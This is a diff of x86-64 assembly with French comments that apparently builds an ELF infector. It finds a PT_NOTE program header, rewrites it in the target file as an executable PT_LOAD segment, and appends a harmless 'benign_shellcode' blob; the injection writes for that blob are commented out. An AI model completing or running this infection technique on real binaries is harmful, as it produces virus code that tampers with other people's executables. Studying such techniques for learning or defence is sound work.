@@ -15,6 +15,7 @@ section .data
     test1 db "HEHEHEHEHEHEHE ",0x0A, 0
     
     
+    
 
    
 
@@ -43,7 +44,7 @@ _start:
     ;mov rax, 1               
     ;mov rdi, 1              
     ;lea rsi, [rel open_success_msg]
-    ;mov rdx, 25              
+    ;mov rdx, 7              
     ;syscall
 
    
@@ -85,7 +86,7 @@ _start:
     mov rax, 1               
     mov rdi, 1              
     lea rsi, [rel elf_message] 
-    mov rdx, 18              
+    mov rdx, 17              
     syscall       
 
      ; Afficher saut de ligne
@@ -126,7 +127,7 @@ _start:
     mov rax, 1               
     mov rdi, 1               
     lea rsi, [rel nbheaders]
-    mov rdx, 20              
+    mov rdx, 17             
     syscall
 
       ; Afficher le retour à la ligne
@@ -161,7 +162,7 @@ _start:
 ;itère pour chaque programme header et check son type si ptnote alors renvoi vers ptnote
 boucle:
     test rcx, rcx            
-    ;jz pasdeptnote      
+    jz pasdeptnote      
 
     ; Afficher un message pour chaque en-tête détecté
     ;mov rax, 1               
@@ -223,16 +224,92 @@ boucle:
     dec rcx                 
     jmp boucle
 
-
 ptnote:
-    
 
+
+    ; Afficher le retour à la ligne
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [rel test1] 
+    mov rdx, 12
+    syscall
+
+    ; Afficher le retour à la ligne
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [rel newline2] 
+    mov rdx, 1
+    syscall
+
+     ; Afficher le retour à la ligne
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [rel crise] 
+    mov rdx, 5
+    syscall
     ; Afficher le retour à la ligne
     mov rax, 1         
     mov rdi, 1        
-    lea rsi, [rel test1] 
+    lea rsi, [rel newline2] 
     mov rdx, 1         
     syscall
+
+
+
+    mov dword [programmheader], 1
+    mov dword [programmheader+4], 0x5
+
+    ;add r13, 4
+    
+    ;mov rax, 8
+   ; mov rdi, r12
+    ;mov rsi, r13
+    ;mov rdx, 0
+    ;syscall
+    ;test rax, rax
+    ;js _exit_with_error
+
+   
+   ; lea rsi, [rel benign_shellcode] 
+    ;mov rdi, r12                    
+   ; mov rdx, 43                    
+   ; mov rax, 1                     
+    ;syscall
+    ;test rax, rax                   
+    ;js _exit_with_error
+
+    ;mov rax, 1            
+   ; mov rdi, r12         
+    ;mov rsi, 0x5 
+    ;mov rdx, 4            
+    ;syscall               
+
+    ;sub r13, 4
+
+    mov rax, 8
+    mov rdi, r12
+    mov rsi, r13
+    mov rdx, 0
+    syscall
+    test rax, rax
+    js _exit_with_error
+
+
+    mov rax, 1
+    mov rdi, r12
+    lea rsi, [rel programmheader]
+    mov rdx, 56
+    syscall
+    test rax, rax
+    js _exit_with_error
+
+
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [rel success_msg]
+    mov rdx, 8
+    syscall
+    jmp close_file
 
     ; Afficher le retour à la ligne
     mov rax, 1         
@@ -241,61 +318,27 @@ ptnote:
     mov rdx, 1         
     syscall
 
-     ; Afficher le retour à la ligne
-    mov rax, 1         
-    mov rdi, 1        
-    lea rsi, [rel crise] 
-    mov rdx, 1         
-    syscall
-
-
-    
-    mov dword [programmheader], 1   
-
-    mov rax, 8        
-    mov rdi, r12      
-    mov rsi, r13     
-    mov rdx, 0       
-    syscall
-    test rax, rax
-    js _exit_with_error
-
-    
-    mov rax, 1              
-    mov rdi, r12            
-    lea rsi, [rel programmheader]  
-    mov rdx, 56              
-    syscall
-    test rax, rax
-    js _exit_with_error
-
-  
-    mov rax, 1
-    mov rdi, 1               
-    lea rsi, [rel success_msg]
-    mov rdx, 14              
-    syscall
-    jmp close_file
-
-
 
 
 
 ;ptnote pas trouvée
-;pasdeptnote:
-    ; Afficher un message d'échec
-   ; mov rax, 1               
-   ; mov rdi, 1              
-   ; lea rsi, [rel failure]
-   ; mov rdx, 18              
-   ; syscall
-    ;jmp close_file
+pasdeptnote:
+     ;Afficher un message d'échec
+    mov rax, 1               
+    mov rdi, 1              
+    lea rsi, [rel failure]
+   mov rdx, 7            
+   syscall
+jmp close_file
 
 
 close_file:
     ; Fermer le fichier
     mov rax, 3               
     mov rdi, r12             
+    syscall
+    mov rax, 60              
+    xor rdi, rdi              
     syscall
 
 
@@ -320,3 +363,15 @@ _exit_with_error:
     mov rax, 60              
     xor rdi, rdi             
     syscall    
+
+
+benign_shellcode:
+    db 0xb8, 0x01, 0x00, 0x00, 0x00   
+    db 0xbf, 0x01, 0x00, 0x00, 0x00   
+    db 0x48, 0x8d, 0x35, 0xef, 0x0f, 0x00, 0x00 
+    db 0xba, 0x08, 0x00, 0x00, 0x00    
+    db 0x0f, 0x05                      
+    db 0xb8, 0x3c, 0x00, 0x00, 0x00    
+    db 0x48, 0x31, 0xff                
+    db 0x0f, 0x05                     
+    message db "Success!", 0x0a
